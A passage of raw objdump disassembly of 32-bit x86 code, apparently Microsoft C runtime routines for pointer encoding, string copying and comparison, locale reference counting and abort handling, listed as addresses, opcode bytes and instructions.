  405099:	55                   	push   %ebp
  40509a:	8b ec                	mov    %esp,%ebp
  40509c:	51                   	push   %ecx
  40509d:	8d 45 08             	lea    0x8(%ebp),%eax
  4050a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4050a3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4050a6:	50                   	push   %eax
  4050a7:	6a 02                	push   $0x2
  4050a9:	e8 22 fd ff ff       	call   0x404dd0
  4050ae:	59                   	pop    %ecx
  4050af:	59                   	pop    %ecx
  4050b0:	8b e5                	mov    %ebp,%esp
  4050b2:	5d                   	pop    %ebp
  4050b3:	c3                   	ret
  4050b4:	8b ff                	mov    %edi,%edi
  4050b6:	55                   	push   %ebp
  4050b7:	8b ec                	mov    %esp,%ebp
  4050b9:	56                   	push   %esi
  4050ba:	8b 75 08             	mov    0x8(%ebp),%esi
  4050bd:	85 f6                	test   %esi,%esi
  4050bf:	75 05                	jne    0x4050c6
  4050c1:	83 c8 ff             	or     $0xffffffff,%eax
  4050c4:	eb 28                	jmp    0x4050ee
  4050c6:	8b 06                	mov    (%esi),%eax
  4050c8:	3b 46 08             	cmp    0x8(%esi),%eax
  4050cb:	75 1f                	jne    0x4050ec
  4050cd:	a1 00 40 41 00       	mov    0x414000,%eax
  4050d2:	83 e0 1f             	and    $0x1f,%eax
  4050d5:	6a 20                	push   $0x20
  4050d7:	59                   	pop    %ecx
  4050d8:	2b c8                	sub    %eax,%ecx
  4050da:	33 c0                	xor    %eax,%eax
  4050dc:	d3 c8                	ror    %cl,%eax
  4050de:	33 05 00 40 41 00    	xor    0x414000,%eax
  4050e4:	89 06                	mov    %eax,(%esi)
  4050e6:	89 46 04             	mov    %eax,0x4(%esi)
  4050e9:	89 46 08             	mov    %eax,0x8(%esi)
  4050ec:	33 c0                	xor    %eax,%eax
  4050ee:	5e                   	pop    %esi
  4050ef:	5d                   	pop    %ebp
  4050f0:	c3                   	ret
  4050f1:	8b ff                	mov    %edi,%edi
  4050f3:	55                   	push   %ebp
  4050f4:	8b ec                	mov    %esp,%ebp
  4050f6:	51                   	push   %ecx
  4050f7:	51                   	push   %ecx
  4050f8:	8d 45 08             	lea    0x8(%ebp),%eax
  4050fb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4050fe:	8d 45 0c             	lea    0xc(%ebp),%eax
  405101:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405104:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405107:	50                   	push   %eax
  405108:	6a 02                	push   $0x2
  40510a:	e8 e9 fc ff ff       	call   0x404df8
  40510f:	59                   	pop    %ecx
  405110:	59                   	pop    %ecx
  405111:	8b e5                	mov    %ebp,%esp
  405113:	5d                   	pop    %ebp
  405114:	c3                   	ret
  405115:	68 80 45 41 00       	push   $0x414580
  40511a:	b9 94 51 41 00       	mov    $0x415194,%ecx
  40511f:	e8 73 f1 ff ff       	call   0x404297
  405124:	b0 01                	mov    $0x1,%al
  405126:	c3                   	ret
  405127:	68 24 4d 41 00       	push   $0x414d24
  40512c:	e8 83 ff ff ff       	call   0x4050b4
  405131:	c7 04 24 30 4d 41 00 	movl   $0x414d30,(%esp)
  405138:	e8 77 ff ff ff       	call   0x4050b4
  40513d:	59                   	pop    %ecx
  40513e:	b0 01                	mov    $0x1,%al
  405140:	c3                   	ret
  405141:	e8 d5 f6 ff ff       	call   0x40481b
  405146:	b0 01                	mov    $0x1,%al
  405148:	c3                   	ret
  405149:	a1 00 40 41 00       	mov    0x414000,%eax
  40514e:	56                   	push   %esi
  40514f:	6a 20                	push   $0x20
  405151:	83 e0 1f             	and    $0x1f,%eax
  405154:	33 f6                	xor    %esi,%esi
  405156:	59                   	pop    %ecx
  405157:	2b c8                	sub    %eax,%ecx
  405159:	d3 ce                	ror    %cl,%esi
  40515b:	33 35 00 40 41 00    	xor    0x414000,%esi
  405161:	56                   	push   %esi
  405162:	e8 47 09 00 00       	call   0x405aae
  405167:	56                   	push   %esi
  405168:	e8 11 2c 00 00       	call   0x407d7e
  40516d:	56                   	push   %esi
  40516e:	e8 b8 2d 00 00       	call   0x407f2b
  405173:	56                   	push   %esi
  405174:	e8 68 f1 ff ff       	call   0x4042e1
  405179:	56                   	push   %esi
  40517a:	e8 e7 f9 ff ff       	call   0x404b66
  40517f:	83 c4 14             	add    $0x14,%esp
  405182:	b0 01                	mov    $0x1,%al
  405184:	5e                   	pop    %esi
  405185:	c3                   	ret
  405186:	6a 00                	push   $0x0
  405188:	e8 d0 d1 ff ff       	call   0x40235d
  40518d:	59                   	pop    %ecx
  40518e:	c3                   	ret
  40518f:	a1 78 45 41 00       	mov    0x414578,%eax
  405194:	83 c9 ff             	or     $0xffffffff,%ecx
  405197:	56                   	push   %esi
  405198:	f0 0f c1 08          	lock xadd %ecx,(%eax)
  40519c:	75 1b                	jne    0x4051b9
  40519e:	a1 78 45 41 00       	mov    0x414578,%eax
  4051a3:	be 58 43 41 00       	mov    $0x414358,%esi
  4051a8:	3b c6                	cmp    %esi,%eax
  4051aa:	74 0d                	je     0x4051b9
  4051ac:	50                   	push   %eax
  4051ad:	e8 b7 0a 00 00       	call   0x405c69
  4051b2:	59                   	pop    %ecx
  4051b3:	89 35 78 45 41 00    	mov    %esi,0x414578
  4051b9:	ff 35 b8 51 41 00    	push   0x4151b8
  4051bf:	e8 a5 0a 00 00       	call   0x405c69
  4051c4:	ff 35 bc 51 41 00    	push   0x4151bc
  4051ca:	33 f6                	xor    %esi,%esi
  4051cc:	89 35 b8 51 41 00    	mov    %esi,0x4151b8
  4051d2:	e8 92 0a 00 00       	call   0x405c69
  4051d7:	ff 35 64 4d 41 00    	push   0x414d64
  4051dd:	89 35 bc 51 41 00    	mov    %esi,0x4151bc
  4051e3:	e8 81 0a 00 00       	call   0x405c69
  4051e8:	ff 35 68 4d 41 00    	push   0x414d68
  4051ee:	89 35 64 4d 41 00    	mov    %esi,0x414d64
  4051f4:	e8 70 0a 00 00       	call   0x405c69
  4051f9:	83 c4 10             	add    $0x10,%esp
  4051fc:	89 35 68 4d 41 00    	mov    %esi,0x414d68
  405202:	b0 01                	mov    $0x1,%al
  405204:	5e                   	pop    %esi
  405205:	c3                   	ret
  405206:	68 d0 dd 40 00       	push   $0x40ddd0
  40520b:	68 58 dd 40 00       	push   $0x40dd58
  405210:	e8 99 2a 00 00       	call   0x407cae
  405215:	59                   	pop    %ecx
  405216:	59                   	pop    %ecx
  405217:	c3                   	ret
  405218:	68 d0 dd 40 00       	push   $0x40ddd0
  40521d:	68 58 dd 40 00       	push   $0x40dd58
  405222:	e8 0a 2b 00 00       	call   0x407d31
  405227:	59                   	pop    %ecx
  405228:	59                   	pop    %ecx
  405229:	c3                   	ret
  40522a:	8b ff                	mov    %edi,%edi
  40522c:	55                   	push   %ebp
  40522d:	8b ec                	mov    %esp,%ebp
  40522f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405232:	8b 45 0c             	mov    0xc(%ebp),%eax
  405235:	81 e1 ff ff f7 ff    	and    $0xfff7ffff,%ecx
  40523b:	23 c1                	and    %ecx,%eax
  40523d:	56                   	push   %esi
  40523e:	8b 75 08             	mov    0x8(%ebp),%esi
  405241:	a9 e0 fc f0 fc       	test   $0xfcf0fce0,%eax
  405246:	74 24                	je     0x40526c
  405248:	85 f6                	test   %esi,%esi
  40524a:	74 0d                	je     0x405259
  40524c:	6a 00                	push   $0x0
  40524e:	6a 00                	push   $0x0
  405250:	e8 cd 2f 00 00       	call   0x408222
  405255:	59                   	pop    %ecx
  405256:	59                   	pop    %ecx
  405257:	89 06                	mov    %eax,(%esi)
  405259:	e8 9b 09 00 00       	call   0x405bf9
  40525e:	6a 16                	push   $0x16
  405260:	5e                   	pop    %esi
  405261:	89 30                	mov    %esi,(%eax)
  405263:	e8 d5 08 00 00       	call   0x405b3d
  405268:	8b c6                	mov    %esi,%eax
  40526a:	eb 1a                	jmp    0x405286
  40526c:	51                   	push   %ecx
  40526d:	ff 75 0c             	push   0xc(%ebp)
  405270:	85 f6                	test   %esi,%esi
  405272:	74 09                	je     0x40527d
  405274:	e8 a9 2f 00 00       	call   0x408222
  405279:	89 06                	mov    %eax,(%esi)
  40527b:	eb 05                	jmp    0x405282
  40527d:	e8 a0 2f 00 00       	call   0x408222
  405282:	59                   	pop    %ecx
  405283:	59                   	pop    %ecx
  405284:	33 c0                	xor    %eax,%eax
  405286:	5e                   	pop    %esi
  405287:	5d                   	pop    %ebp
  405288:	c3                   	ret
  405289:	6a 0c                	push   $0xc
  40528b:	68 20 27 41 00       	push   $0x412720
  405290:	e8 8b 6d 00 00       	call   0x40c020
  405295:	e8 8a 05 00 00       	call   0x405824
  40529a:	8b 70 0c             	mov    0xc(%eax),%esi
  40529d:	85 f6                	test   %esi,%esi
  40529f:	74 1e                	je     0x4052bf
  4052a1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4052a5:	8b ce                	mov    %esi,%ecx
  4052a7:	ff 15 3c d1 40 00    	call   *0x40d13c
  4052ad:	ff d6                	call   *%esi
  4052af:	eb 07                	jmp    0x4052b8
  4052b1:	33 c0                	xor    %eax,%eax
  4052b3:	40                   	inc    %eax
  4052b4:	c3                   	ret
  4052b5:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4052b8:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4052bf:	e8 01 00 00 00       	call   0x4052c5
  4052c4:	cc                   	int3
  4052c5:	e8 4a 2c 00 00       	call   0x407f14
  4052ca:	85 c0                	test   %eax,%eax
  4052cc:	74 08                	je     0x4052d6
  4052ce:	6a 16                	push   $0x16
  4052d0:	e8 9a 2c 00 00       	call   0x407f6f
  4052d5:	59                   	pop    %ecx
  4052d6:	f6 05 40 40 41 00 02 	testb  $0x2,0x414040
  4052dd:	74 21                	je     0x405300
  4052df:	6a 17                	push   $0x17
  4052e1:	e8 76 6b 00 00       	call   0x40be5c
  4052e6:	85 c0                	test   %eax,%eax
  4052e8:	74 05                	je     0x4052ef
  4052ea:	6a 07                	push   $0x7
  4052ec:	59                   	pop    %ecx
  4052ed:	cd 29                	int    $0x29
  4052ef:	6a 01                	push   $0x1
  4052f1:	68 15 00 00 40       	push   $0x40000015
  4052f6:	6a 03                	push   $0x3
  4052f8:	e8 76 06 00 00       	call   0x405973
  4052fd:	83 c4 0c             	add    $0xc,%esp
  405300:	6a 03                	push   $0x3
  405302:	e8 8c f8 ff ff       	call   0x404b93
  405307:	cc                   	int3
  405308:	e9 5c 09 00 00       	jmp    0x405c69
  40530d:	8b ff                	mov    %edi,%edi
  40530f:	55                   	push   %ebp
  405310:	8b ec                	mov    %esp,%ebp
  405312:	5d                   	pop    %ebp
  405313:	e9 e7 23 00 00       	jmp    0x4076ff
  405318:	8b ff                	mov    %edi,%edi
  40531a:	55                   	push   %ebp
  40531b:	8b ec                	mov    %esp,%ebp
  40531d:	8b 55 08             	mov    0x8(%ebp),%edx
  405320:	56                   	push   %esi
  405321:	85 d2                	test   %edx,%edx
  405323:	74 11                	je     0x405336
  405325:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405328:	85 c9                	test   %ecx,%ecx
  40532a:	74 0a                	je     0x405336
  40532c:	8b 75 10             	mov    0x10(%ebp),%esi
  40532f:	85 f6                	test   %esi,%esi
  405331:	75 17                	jne    0x40534a
  405333:	c6 02 00             	movb   $0x0,(%edx)
  405336:	e8 be 08 00 00       	call   0x405bf9
  40533b:	6a 16                	push   $0x16
  40533d:	5e                   	pop    %esi
  40533e:	89 30                	mov    %esi,(%eax)
  405340:	e8 f8 07 00 00       	call   0x405b3d
  405345:	8b c6                	mov    %esi,%eax
  405347:	5e                   	pop    %esi
  405348:	5d                   	pop    %ebp
  405349:	c3                   	ret
  40534a:	57                   	push   %edi
  40534b:	8b fa                	mov    %edx,%edi
  40534d:	2b f2                	sub    %edx,%esi
  40534f:	8a 04 3e             	mov    (%esi,%edi,1),%al
  405352:	88 07                	mov    %al,(%edi)
  405354:	47                   	inc    %edi
  405355:	84 c0                	test   %al,%al
  405357:	74 05                	je     0x40535e
  405359:	83 e9 01             	sub    $0x1,%ecx
  40535c:	75 f1                	jne    0x40534f
  40535e:	5f                   	pop    %edi
  40535f:	85 c9                	test   %ecx,%ecx
  405361:	75 0b                	jne    0x40536e
  405363:	88 0a                	mov    %cl,(%edx)
  405365:	e8 8f 08 00 00       	call   0x405bf9
  40536a:	6a 22                	push   $0x22
  40536c:	eb cf                	jmp    0x40533d
  40536e:	33 f6                	xor    %esi,%esi
  405370:	eb d3                	jmp    0x405345
  405372:	8b ff                	mov    %edi,%edi
  405374:	55                   	push   %ebp
  405375:	8b ec                	mov    %esp,%ebp
  405377:	5d                   	pop    %ebp
  405378:	e9 8f 08 00 00       	jmp    0x405c0c
  40537d:	8b ff                	mov    %edi,%edi
  40537f:	55                   	push   %ebp
  405380:	8b ec                	mov    %esp,%ebp
  405382:	57                   	push   %edi
  405383:	8b f9                	mov    %ecx,%edi
  405385:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405388:	c6 47 0c 00          	movb   $0x0,0xc(%edi)
  40538c:	85 c9                	test   %ecx,%ecx
  40538e:	74 0a                	je     0x40539a
  405390:	8b 01                	mov    (%ecx),%eax
  405392:	89 47 04             	mov    %eax,0x4(%edi)
  405395:	8b 41 04             	mov    0x4(%ecx),%eax
  405398:	eb 16                	jmp    0x4053b0
  40539a:	a1 18 4d 41 00       	mov    0x414d18,%eax
  40539f:	85 c0                	test   %eax,%eax
  4053a1:	75 12                	jne    0x4053b5
  4053a3:	a1 38 46 41 00       	mov    0x414638,%eax
  4053a8:	89 47 04             	mov    %eax,0x4(%edi)
  4053ab:	a1 3c 46 41 00       	mov    0x41463c,%eax
  4053b0:	89 47 08             	mov    %eax,0x8(%edi)
  4053b3:	eb 44                	jmp    0x4053f9
  4053b5:	56                   	push   %esi
  4053b6:	e8 69 04 00 00       	call   0x405824
  4053bb:	8d 57 04             	lea    0x4(%edi),%edx
  4053be:	89 07                	mov    %eax,(%edi)
  4053c0:	52                   	push   %edx
  4053c1:	8d 77 08             	lea    0x8(%edi),%esi
  4053c4:	8b 48 4c             	mov    0x4c(%eax),%ecx
  4053c7:	89 0a                	mov    %ecx,(%edx)
  4053c9:	8b 48 48             	mov    0x48(%eax),%ecx
  4053cc:	50                   	push   %eax
  4053cd:	89 0e                	mov    %ecx,(%esi)
  4053cf:	e8 fd 32 00 00       	call   0x4086d1
  4053d4:	56                   	push   %esi
  4053d5:	ff 37                	push   (%edi)
  4053d7:	e8 22 33 00 00       	call   0x4086fe
  4053dc:	8b 0f                	mov    (%edi),%ecx
  4053de:	83 c4 10             	add    $0x10,%esp
  4053e1:	8b 81 50 03 00 00    	mov    0x350(%ecx),%eax
  4053e7:	5e                   	pop    %esi
  4053e8:	a8 02                	test   $0x2,%al
  4053ea:	75 0d                	jne    0x4053f9
  4053ec:	83 c8 02             	or     $0x2,%eax
  4053ef:	89 81 50 03 00 00    	mov    %eax,0x350(%ecx)
  4053f5:	c6 47 0c 01          	movb   $0x1,0xc(%edi)
  4053f9:	8b c7                	mov    %edi,%eax
  4053fb:	5f                   	pop    %edi
  4053fc:	5d                   	pop    %ebp
  4053fd:	c2 04 00             	ret    $0x4
  405400:	53                   	push   %ebx
  405401:	56                   	push   %esi
  405402:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  405406:	8b 54 24 10          	mov    0x10(%esp),%edx
  40540a:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40540e:	f7 c3 ff ff ff ff    	test   $0xffffffff,%ebx
  405414:	74 50                	je     0x405466
  405416:	2b ca                	sub    %edx,%ecx
  405418:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40541e:	74 17                	je     0x405437
  405420:	0f b6 04 0a          	movzbl (%edx,%ecx,1),%eax
  405424:	3a 02                	cmp    (%edx),%al
  405426:	75 48                	jne    0x405470
  405428:	85 c0                	test   %eax,%eax
  40542a:	74 3a                	je     0x405466
  40542c:	42                   	inc    %edx
  40542d:	83 eb 01             	sub    $0x1,%ebx
  405430:	76 34                	jbe    0x405466
  405432:	f6 c2 03             	test   $0x3,%dl
  405435:	75 e9                	jne    0x405420
  405437:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  40543a:	25 ff 0f 00 00       	and    $0xfff,%eax
  40543f:	3d fc 0f 00 00       	cmp    $0xffc,%eax
  405444:	77 da                	ja     0x405420
  405446:	8b 04 0a             	mov    (%edx,%ecx,1),%eax
  405449:	3b 02                	cmp    (%edx),%eax
  40544b:	75 d3                	jne    0x405420
  40544d:	83 eb 04             	sub    $0x4,%ebx
  405450:	76 14                	jbe    0x405466
  405452:	8d b0 ff fe fe fe    	lea    -0x1010101(%eax),%esi
  405458:	83 c2 04             	add    $0x4,%edx
  40545b:	f7 d0                	not    %eax
  40545d:	23 c6                	and    %esi,%eax
  40545f:	a9 80 80 80 80       	test   $0x80808080,%eax
  405464:	74 d1                	je     0x405437
  405466:	33 c0                	xor    %eax,%eax
  405468:	5e                   	pop    %esi
  405469:	5b                   	pop    %ebx
  40546a:	c3                   	ret
  40546b:	eb 03                	jmp    0x405470
  40546d:	cc                   	int3
  40546e:	cc                   	int3
  40546f:	cc                   	int3
  405470:	1b c0                	sbb    %eax,%eax
  405472:	83 c8 01             	or     $0x1,%eax
  405475:	5e                   	pop    %esi
  405476:	5b                   	pop    %ebx
  405477:	c3                   	ret
  405478:	8b ff                	mov    %edi,%edi
  40547a:	55                   	push   %ebp
  40547b:	8b ec                	mov    %esp,%ebp
  40547d:	8b 45 10             	mov    0x10(%ebp),%eax
  405480:	85 c0                	test   %eax,%eax
  405482:	75 02                	jne    0x405486
  405484:	5d                   	pop    %ebp
  405485:	c3                   	ret
  405486:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405489:	8b 55 08             	mov    0x8(%ebp),%edx
  40548c:	56                   	push   %esi
  40548d:	83 e8 01             	sub    $0x1,%eax
  405490:	74 15                	je     0x4054a7
  405492:	0f b7 32             	movzwl (%edx),%esi
  405495:	66 85 f6             	test   %si,%si
  405498:	74 0d                	je     0x4054a7
  40549a:	66 3b 31             	cmp    (%ecx),%si
  40549d:	75 08                	jne    0x4054a7
  40549f:	83 c2 02             	add    $0x2,%edx
  4054a2:	83 c1 02             	add    $0x2,%ecx
  4054a5:	eb e6                	jmp    0x40548d
  4054a7:	0f b7 02             	movzwl (%edx),%eax
  4054aa:	0f b7 09             	movzwl (%ecx),%ecx
  4054ad:	2b c1                	sub    %ecx,%eax
  4054af:	5e                   	pop    %esi
  4054b0:	5d                   	pop    %ebp
  4054b1:	c3                   	ret
  4054b2:	6a 08                	push   $0x8
  4054b4:	68 60 27 41 00       	push   $0x412760
  4054b9:	e8 e2 c6 ff ff       	call   0x401ba0
  4054be:	8b 45 08             	mov    0x8(%ebp),%eax
  4054c1:	ff 30                	push   (%eax)
  4054c3:	e8 1a 16 00 00       	call   0x406ae2
  4054c8:	59                   	pop    %ecx
  4054c9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4054cd:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4054d0:	8b 41 04             	mov    0x4(%ecx),%eax
  4054d3:	8b 00                	mov    (%eax),%eax
  4054d5:	ff 30                	push   (%eax)
  4054d7:	8b 01                	mov    (%ecx),%eax
  4054d9:	ff 30                	push   (%eax)
  4054db:	e8 f9 02 00 00       	call   0x4057d9
  4054e0:	59                   	pop    %ecx
  4054e1:	59                   	pop    %ecx
  4054e2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4054e9:	e8 08 00 00 00       	call   0x4054f6
  4054ee:	e8 fd c6 ff ff       	call   0x401bf0
  4054f3:	c2 0c 00             	ret    $0xc
  4054f6:	8b 45 10             	mov    0x10(%ebp),%eax
  4054f9:	ff 30                	push   (%eax)
  4054fb:	e8 2a 16 00 00       	call   0x406b2a
  405500:	59                   	pop    %ecx
  405501:	c3                   	ret
  405502:	6a 08                	push   $0x8
  405504:	68 80 27 41 00       	push   $0x412780
  405509:	e8 92 c6 ff ff       	call   0x401ba0
  40550e:	8b 45 08             	mov    0x8(%ebp),%eax
  405511:	ff 30                	push   (%eax)
  405513:	e8 ca 15 00 00       	call   0x406ae2
  405518:	59                   	pop    %ecx
  405519:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40551d:	8b 45 0c             	mov    0xc(%ebp),%eax
  405520:	8b 00                	mov    (%eax),%eax
  405522:	8b 00                	mov    (%eax),%eax
  405524:	8b 48 48             	mov    0x48(%eax),%ecx
  405527:	85 c9                	test   %ecx,%ecx
  405529:	74 18                	je     0x405543
  40552b:	83 c8 ff             	or     $0xffffffff,%eax
  40552e:	f0 0f c1 01          	lock xadd %eax,(%ecx)
  405532:	75 0f                	jne    0x405543
  405534:	81 f9 58 43 41 00    	cmp    $0x414358,%ecx
  40553a:	74 07                	je     0x405543
  40553c:	51                   	push   %ecx
  40553d:	e8 27 07 00 00       	call   0x405c69
  405542:	59                   	pop    %ecx
  405543:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40554a:	e8 08 00 00 00       	call   0x405557
  40554f:	e8 9c c6 ff ff       	call   0x401bf0
  405554:	c2 0c 00             	ret    $0xc
  405557:	8b 45 10             	mov    0x10(%ebp),%eax
  40555a:	ff 30                	push   (%eax)
  40555c:	e8 c9 15 00 00       	call   0x406b2a
  405561:	59                   	pop    %ecx
  405562:	c3                   	ret
  405563:	6a 08                	push   $0x8
  405565:	68 a0 27 41 00       	push   $0x4127a0
  40556a:	e8 31 c6 ff ff       	call   0x401ba0
  40556f:	8b 45 08             	mov    0x8(%ebp),%eax
  405572:	ff 30                	push   (%eax)
  405574:	e8 69 15 00 00       	call   0x406ae2
  405579:	59                   	pop    %ecx
  40557a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40557e:	6a 00                	push   $0x0
  405580:	8b 45 0c             	mov    0xc(%ebp),%eax
  405583:	8b 00                	mov    (%eax),%eax
  405585:	ff 30                	push   (%eax)
  405587:	e8 4d 02 00 00       	call   0x4057d9
  40558c:	59                   	pop    %ecx
  40558d:	59                   	pop    %ecx
  40558e:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405595:	e8 08 00 00 00       	call   0x4055a2
  40559a:	e8 51 c6 ff ff       	call   0x401bf0
  40559f:	c2 0c 00             	ret    $0xc
  4055a2:	8b 45 10             	mov    0x10(%ebp),%eax
  4055a5:	ff 30                	push   (%eax)
  4055a7:	e8 7e 15 00 00       	call   0x406b2a
  4055ac:	59                   	pop    %ecx
  4055ad:	c3                   	ret
  4055ae:	6a 08                	push   $0x8
  4055b0:	68 40 27 41 00       	push   $0x412740
  4055b5:	e8 e6 c5 ff ff       	call   0x401ba0
  4055ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4055bd:	ff 30                	push   (%eax)
  4055bf:	e8 1e 15 00 00       	call   0x406ae2
  4055c4:	59                   	pop    %ecx
  4055c5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4055c9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4055cc:	8b 00                	mov    (%eax),%eax
  4055ce:	8b 00                	mov    (%eax),%eax
  4055d0:	8b 40 48             	mov    0x48(%eax),%eax
  4055d3:	f0 ff 00             	lock incl (%eax)
  4055d6:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4055dd:	e8 08 00 00 00       	call   0x4055ea
  4055e2:	e8 09 c6 ff ff       	call   0x401bf0
  4055e7:	c2 0c 00             	ret    $0xc
  4055ea:	8b 45 10             	mov    0x10(%ebp),%eax
  4055ed:	ff 30                	push   (%eax)
  4055ef:	e8 36 15 00 00       	call   0x406b2a
  4055f4:	59                   	pop    %ecx
  4055f5:	c3                   	ret
  4055f6:	8b ff                	mov    %edi,%edi
  4055f8:	55                   	push   %ebp
  4055f9:	8b ec                	mov    %esp,%ebp
  4055fb:	83 ec 0c             	sub    $0xc,%esp
  4055fe:	8b 45 08             	mov    0x8(%ebp),%eax
  405601:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  405604:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405607:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40560a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40560d:	50                   	push   %eax
  40560e:	ff 75 0c             	push   0xc(%ebp)
  405611:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405614:	50                   	push   %eax
  405615:	e8 e8 fe ff ff       	call   0x405502
  40561a:	8b e5                	mov    %ebp,%esp
  40561c:	5d                   	pop    %ebp
  40561d:	c3                   	ret
  40561e:	8b ff                	mov    %edi,%edi
  405620:	55                   	push   %ebp
  405621:	8b ec                	mov    %esp,%ebp
  405623:	83 ec 0c             	sub    $0xc,%esp
  405626:	8b 45 08             	mov    0x8(%ebp),%eax
  405629:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40562c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40562f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405632:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405635:	50                   	push   %eax
  405636:	ff 75 0c             	push   0xc(%ebp)
  405639:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40563c:	50                   	push   %eax
  40563d:	e8 70 fe ff ff       	call   0x4054b2
  405642:	8b e5                	mov    %ebp,%esp
  405644:	5d                   	pop    %ebp
  405645:	c3                   	ret
  405646:	8b ff                	mov    %edi,%edi
  405648:	55                   	push   %ebp
  405649:	8b ec                	mov    %esp,%ebp
  40564b:	83 ec 0c             	sub    $0xc,%esp
  40564e:	8b 45 08             	mov    0x8(%ebp),%eax
  405651:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  405654:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405657:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40565a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40565d:	50                   	push   %eax
  40565e:	ff 75 0c             	push   0xc(%ebp)
  405661:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405664:	50                   	push   %eax
  405665:	e8 f9 fe ff ff       	call   0x405563
  40566a:	8b e5                	mov    %ebp,%esp
  40566c:	5d                   	pop    %ebp
  40566d:	c3                   	ret
  40566e:	8b ff                	mov    %edi,%edi
  405670:	55                   	push   %ebp
  405671:	8b ec                	mov    %esp,%ebp
  405673:	83 ec 0c             	sub    $0xc,%esp
  405676:	8b 45 08             	mov    0x8(%ebp),%eax
  405679:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40567c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40567f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405682:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405685:	50                   	push   %eax
  405686:	ff 75 0c             	push   0xc(%ebp)
  405689:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40568c:	50                   	push   %eax
  40568d:	e8 1c ff ff ff       	call   0x4055ae
  405692:	8b e5                	mov    %ebp,%esp
  405694:	5d                   	pop    %ebp
  405695:	c3                   	ret
  405696:	8b ff                	mov    %edi,%edi
  405698:	55                   	push   %ebp
  405699:	8b ec                	mov    %esp,%ebp
  40569b:	51                   	push   %ecx
  40569c:	51                   	push   %ecx
  40569d:	8b 45 08             	mov    0x8(%ebp),%eax
  4056a0:	33 c9                	xor    %ecx,%ecx
  4056a2:	41                   	inc    %ecx
  4056a3:	6a 43                	push   $0x43
  4056a5:	89 48 18             	mov    %ecx,0x18(%eax)
  4056a8:	8b 45 08             	mov    0x8(%ebp),%eax
  4056ab:	c7 00 90 dc 40 00    	movl   $0x40dc90,(%eax)
  4056b1:	8b 45 08             	mov    0x8(%ebp),%eax
  4056b4:	89 88 50 03 00 00    	mov    %ecx,0x350(%eax)
  4056ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4056bd:	59                   	pop    %ecx
  4056be:	c7 40 48 58 43 41 00 	movl   $0x414358,0x48(%eax)
  4056c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4056c8:	66 89 48 6c          	mov    %cx,0x6c(%eax)
  4056cc:	8b 45 08             	mov    0x8(%ebp),%eax
  4056cf:	66 89 88 72 01 00 00 	mov    %cx,0x172(%eax)
  4056d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4056d9:	83 a0 4c 03 00 00 00 	andl   $0x0,0x34c(%eax)
  4056e0:	8d 45 08             	lea    0x8(%ebp),%eax
  4056e3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4056e6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4056e9:	50                   	push   %eax
  4056ea:	6a 05                	push   $0x5
  4056ec:	e8 7d ff ff ff       	call   0x40566e
  4056f1:	8d 45 08             	lea    0x8(%ebp),%eax
  4056f4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4056f7:	8d 45 0c             	lea    0xc(%ebp),%eax
  4056fa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4056fd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405700:	50                   	push   %eax
  405701:	6a 04                	push   $0x4
  405703:	e8 16 ff ff ff       	call   0x40561e
  405708:	83 c4 10             	add    $0x10,%esp
  40570b:	8b e5                	mov    %ebp,%esp
  40570d:	5d                   	pop    %ebp
  40570e:	c3                   	ret
  40570f:	8b ff                	mov    %edi,%edi
  405711:	55                   	push   %ebp
  405712:	8b ec                	mov    %esp,%ebp
  405714:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405718:	74 12                	je     0x40572c
  40571a:	ff 75 08             	push   0x8(%ebp)
  40571d:	e8 0e 00 00 00       	call   0x405730
